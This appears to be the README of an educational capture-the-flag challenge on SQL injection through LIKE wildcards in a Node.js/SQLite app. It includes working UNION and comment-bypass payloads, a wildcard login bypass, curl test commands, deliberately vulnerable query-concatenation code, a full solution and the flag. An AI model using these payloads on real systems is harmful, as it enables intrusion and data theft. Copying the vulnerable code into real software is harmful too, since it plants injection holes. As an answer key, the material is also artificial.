# 🚩 H7CTF - Advanced SQL Injection Challenge with Wildcards

## 🎯 Challenge Overview

**Name:** SQL Injection Wildcards Challenge  
**Difficulty:** Hard 💀  
**Category:** Web Exploitation / SQL Injection  
**Flag Format:** `H7CTF{...}`  

This is an advanced SQL injection challenge that focuses on exploiting wildcard characters in SQL LIKE operators. Players must discover and exploit multiple injection points to find the hidden flag.

## 🚀 Quick Start

### Prerequisites
- Node.js (v14 or higher)
- npm

### Installation & Setup

```bash
# Clone/Download the challenge files
cd H7CTF/SQLI

# Install dependencies
npm install

# Start the challenge server
npm start
```

The server will start at `http://localhost:3000`

### Development Mode
```bash
npm run dev  # Uses nodemon for auto-restart
```

## 🎮 Challenge Description

You've discovered a user search system that appears to have some security vulnerabilities. The system uses SQL LIKE operators with wildcards, creating multiple injection opportunities. Your goal is to find the hidden flag stored somewhere in the database.

### Learning Objectives
- Understanding SQL wildcard characters (`%` and `_`)
- Exploiting LIKE operators in SQL injection
- Bypassing basic keyword filtering
- Using UNION-based SQL injection techniques
- Database enumeration and information gathering
- Authentication bypass using wildcards

## 🔍 Available Endpoints

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| `GET` | `/` | Challenge home page | - |
| `POST` | `/search` | User search functionality | **SQL Injection** |
| `GET` | `/user/:username` | Get user details | **SQL Injection** |
| `GET` | `/login` | Login page | - |
| `POST` | `/login` | User authentication | **Wildcard Bypass** |
| `GET` | `/debug/tables` | Debug endpoint (lists tables) | **Information Disclosure** |
| `GET` | `/debug/schema/:table` | Get table schema | **Information Disclosure** |
| `POST` | `/admin/query` | Admin query endpoint | **Raw SQL Execution** |

## 🛡️ Security Measures (To Bypass)

1. **Keyword Filtering**: Basic blacklist blocks common SQL injection terms
2. **LIKE Operators**: Uses LIKE instead of = for comparisons
3. **Role-based Access**: Admin endpoints require admin privileges
4. **Input Validation**: Basic validation that can be circumvented

## 💡 Hints & Techniques

### SQL Wildcards
- `%` - Matches any number of characters (including zero)
- `_` - Matches exactly one character

### Basic Wildcard Injection
```sql
-- Search endpoint
%' UNION SELECT 1,2,3,4--
test' OR '1'='1'--

-- Login bypass
Username: %
Password: %
```

### Advanced Techniques
```sql
-- Bypass keyword filters
%' /**/UNION/**/SELECT/**/1,2,3,4--
%' UNION SELECT name,type,sql,'' FROM sqlite_master--

-- Information gathering
%' UNION SELECT sql,'','','' FROM sqlite_master WHERE type='table'--
```

## 🗄️ Database Schema

The challenge includes several tables:

- **users** - Standard user accounts (decoy data)
- **admin_secrets** - Contains the flag (target)
- **system_logs** - Access logs
- **products** - Product information (red herring)

## 🎯 Solution Walkthrough

### Step 1: Reconnaissance
1. Start at the home page (`/`)
2. Explore available endpoints
3. Check debug endpoints for table information

### Step 2: Basic Injection Testing
```bash
# Test the search endpoint
curl -X POST http://localhost:3000/search -d "query=%"

# Test user details endpoint
curl http://localhost:3000/user/%27%20OR%20%271%27=%271%27--
```

### Step 3: Bypass Authentication
```bash
# Wildcard login bypass
curl -X POST http://localhost:3000/login \
  -d "username=%&password=%"
```

### Step 4: Information Gathering
```sql
-- Discover tables
%' UNION SELECT name,'','','' FROM sqlite_master WHERE type='table'--

-- Get table schema
%' UNION SELECT sql,'','','' FROM sqlite_master WHERE name='admin_secrets'--
```

### Step 5: Extract the Flag
```sql
-- Get the flag from admin_secrets table
%' UNION SELECT flag,secret_key,description,'' FROM admin_secrets--
```

## 🏆 Complete Solution

### Method 1: Direct UNION Injection
1. **Discover Tables:**
   ```
   POST /search
   query: %' UNION SELECT name,type,sql,'' FROM sqlite_master--
   ```

2. **Extract Flag:**
   ```
   POST /search
   query: %' UNION SELECT flag,secret_key,description,'' FROM admin_secrets--
   ```

### Method 2: Authentication Bypass + Admin Query
1. **Bypass Login:**
   ```
   POST /login
   username: %
   password: %
   ```

2. **Use Admin Endpoint:**
   ```
   POST /admin/query
   sql: SELECT * FROM admin_secrets
   ```

### Method 3: Comment-based Bypass
```sql
-- Bypass keyword filtering
%' /**/UNION/**/ALL/**/SELECT/**/flag,secret_key,description,access_level/**/FROM/**/admin_secrets--
```

## 🔧 Technical Details

### Why This Works in Node.js

1. **Dynamic Query Construction**: String concatenation makes injection trivial
2. **SQLite Integration**: Direct SQL execution without built-in protection
3. **Express.js Flexibility**: Easy to create multiple vulnerable endpoints
4. **Async Error Handling**: Improper error handling exposes database information

### Vulnerable Code Examples

```javascript
// Vulnerable search function
searchUsers(query, callback) {
    const sql = `SELECT username, email, role, created_at FROM users 
                 WHERE username LIKE '%${query}%' OR email LIKE '%${query}%'`;
    this.db.all(sql, [], callback);
}

// Vulnerable authentication
authenticateUser(username, password, callback) {
    const sql = `SELECT * FROM users 
                 WHERE username LIKE '${username}' AND password LIKE '${password}'`;
    this.db.get(sql, [], callback);
}
```

## 🎁 Flags & Scoring

- **Main Flag**: `H7CTF{W1LD_C4RD5_4R3_D4NG3R0U5_1N_5QL_1NJ3CT10N}`
- **Bonus Points**: Finding multiple injection methods
- **Extra Credit**: Achieving admin access through different techniques

## 📚 Educational Value

This challenge teaches:
- **SQL Injection Fundamentals**: Classic injection techniques
- **Wildcard Exploitation**: Specific LIKE operator vulnerabilities
- **Filter Bypass**: Circumventing basic security measures
- **Database Enumeration**: Information gathering techniques
- **Authentication Bypass**: Login circumvention methods

## 🛠️ Customization

### Difficulty Adjustment
- **Easier**: Remove keyword filtering, add more hints
- **Harder**: Add WAF simulation, implement time-based blind injection

### Additional Features
- **Blind SQL Injection**: Modify to remove direct output
- **Time-based Attacks**: Add sleep-based injection points
- **Second-order Injection**: Store and execute payloads later

## 🔒 Security Lessons

This challenge demonstrates why developers should:
1. **Never concatenate user input** directly into SQL queries
2. **Use parameterized queries** or prepared statements
3. **Implement proper input validation** and sanitization
4. **Apply principle of least privilege** for database access
5. **Avoid exposing database errors** to users

## 🤝 Contributing

Feel free to:
- Add new injection techniques
- Improve the user interface
- Create additional difficulty levels
- Add more realistic scenarios

## 📄 License

This challenge is created for educational purposes. Use responsibly and only in authorized environments.

---

**Happy Hacking! 🎯**

Remember: This is for educational purposes only. Never test these techniques on systems you don't own or have explicit permission to test.